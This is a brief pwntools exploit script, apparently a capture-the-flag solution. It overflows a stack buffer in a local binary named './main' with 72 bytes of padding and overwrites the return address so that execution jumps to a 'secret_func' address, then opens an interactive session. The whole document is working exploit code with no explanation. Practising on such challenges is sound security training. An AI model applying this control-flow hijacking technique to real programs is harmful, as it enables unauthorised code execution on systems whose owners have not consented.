from pwn import *

#p = remote("")
p = process('./main')

pad = b'A' * 72
secret_func = 0x40132d

p.sendline(pad + p64(secret_func+1))

p.interactive()
